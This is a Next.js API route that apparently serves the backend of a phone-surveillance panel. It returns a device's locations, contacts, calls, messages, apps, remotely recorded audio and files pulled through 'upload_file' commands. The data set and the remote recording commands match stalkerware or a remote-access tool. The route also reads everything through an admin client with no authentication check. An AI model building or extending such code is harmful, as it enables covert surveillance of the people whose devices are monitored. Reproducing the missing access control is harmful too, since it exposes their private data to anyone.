// app/api/devices/[id]/data/route.ts
import { NextResponse } from "next/server";
import { createAdminClient } from "@/lib/supabase/admin";

export const dynamic = "force-dynamic";
export const revalidate = 0;

const NO_CACHE_HEADERS = {
  "Cache-Control": "no-store, no-cache, must-revalidate, proxy-revalidate",
  Pragma: "no-cache",
  Expires: "0",
};

export async function GET(
  request: Request,
  { params }: { params: { id: string } }
) {
  try {
    const { searchParams } = new URL(request.url);
    const type = searchParams.get("type") || "locations";
    const limit = Math.min(Number(searchParams.get("limit") || 10000), 20000);
    const search = searchParams.get("q")?.toLowerCase();
    const admin = createAdminClient();

    if (type === "locations") {
      const { data, error } = await admin
        .from("device_locations")
        .select("*")
        .eq("device_id", params.id)
        .order("created_at", { ascending: false })
        .limit(limit);
      if (error) throw error;
      return NextResponse.json({ locations: data || [] }, { headers: NO_CACHE_HEADERS });
    }

    if (type === "contacts") {
      if (search) {
        const { data, error } = await admin
          .from("device_contacts")
          .select("*")
          .eq("device_id", params.id)
          .ilike("name", `%${search}%`)
          .order("name", { ascending: true })
          .limit(limit);
        if (error) throw error;
        return NextResponse.json({ contacts: data || [] }, { headers: NO_CACHE_HEADERS });
      }

      let allContacts: any[] = [];
      let from = 0;
      let hasMore = true;
      while (hasMore && allContacts.length < limit) {
        const to = from + 999;
        const { data, error } = await admin
          .from("device_contacts")
          .select("*")
          .eq("device_id", params.id)
          .order("name", { ascending: true })
          .range(from, to);
        if (error) throw error;
        if (!data || data.length === 0) hasMore = false;
        else {
          allContacts = allContacts.concat(data);
          if (data.length < 1000) hasMore = false;
          else from += 1000;
        }
      }
      return NextResponse.json({ contacts: allContacts }, { headers: NO_CACHE_HEADERS });
    }

    if (type === "calls") {
      const { data, error } = await admin
        .from("device_calls")
        .select("*")
        .eq("device_id", params.id)
        .order("timestamp", { ascending: false })
        .limit(limit);
      if (error) throw error;
      return NextResponse.json({ calls: data || [] }, { headers: NO_CACHE_HEADERS });
    }

    if (type === "messages") {
      const { data, error } = await admin
        .from("device_messages")
        .select("*")
        .eq("device_id", params.id)
        .order("timestamp", { ascending: false })
        .limit(limit);
      if (error) throw error;
      return NextResponse.json({ messages: data || [] }, { headers: NO_CACHE_HEADERS });
    }

    if (type === "apps") {
      let query = admin
        .from("device_installed_apps")
        .select("*")
        .eq("device_id", params.id)
        .order("usage_time_seconds", { ascending: false })
        .limit(limit);
      if (search) query = query.ilike("app_name", `%${search}%`);
      const { data, error } = await query;
      if (error) throw error;
      return NextResponse.json({ apps: data || [] }, { headers: NO_CACHE_HEADERS });
    }

    if (type === "audio") {
      const { data, error } = await admin
        .from("device_commands")
        .select("*")
        .eq("device_id", params.id)
        .eq("command", "record_audio")
        .not("result_media_path", "is", null)
        .order("created_at", { ascending: false })
        .limit(limit);
      if (error) throw error;
      return NextResponse.json({ audio: data || [] }, { headers: NO_CACHE_HEADERS });
    }

    if (type === "files") {
      const category = searchParams.get("category");
      let query = admin
        .from("device_files")
        .select("*")
        .eq("device_id", params.id)
        .order("created_at", { ascending: false })
        .limit(limit);
      if (category && category !== "all") {
        query = query.eq("file_type", category);
      }
      if (search) {
        query = query.ilike("file_name", `%${search}%`);
      }
      const { data, error } = await query;
      if (error) throw error;

      const filesList = data || [];
      const { data: uploadCmds } = await admin
        .from("device_commands")
        .select("payload, result_media_path")
        .eq("device_id", params.id)
        .eq("command", "upload_file")
        .eq("status", "executed")
        .not("result_media_path", "is", null);

      if (uploadCmds && uploadCmds.length > 0) {
        const cmdMap = new Map<string, string>();
        for (const c of uploadCmds) {
          if (c.payload?.file_path && c.result_media_path) {
            cmdMap.set(c.payload.file_path, c.result_media_path);
          }
        }
        for (const f of filesList) {
          if (!f.storage_path && cmdMap.has(f.file_path)) {
            f.storage_path = cmdMap.get(f.file_path)!;
          }
        }
      }

      return NextResponse.json({ files: filesList }, { headers: NO_CACHE_HEADERS });
    }

    return NextResponse.json(
      { error: "Invalid type requested" },
      { status: 400, headers: NO_CACHE_HEADERS }
    );
  } catch (err: any) {
    return NextResponse.json(
      { error: err.message },
      { status: 500, headers: NO_CACHE_HEADERS }
    );
  }
}
